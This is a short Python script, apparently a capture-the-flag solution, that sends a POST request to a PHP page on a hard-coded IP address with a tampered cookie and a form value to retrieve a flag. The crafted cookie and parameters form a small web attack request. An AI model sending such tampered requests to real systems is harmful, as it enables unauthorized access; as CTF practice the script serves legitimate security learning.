import requests
import time
 
url='http://183.129.189.60:10080/DrI01$.php?no=f_flag'

cookies = { "message":"{\"satisfy\":\"no\"}" }
data={"f_flag":"GoodDrink"}
response=requests.post(url,cookies=cookies,data=data)

print(response.text)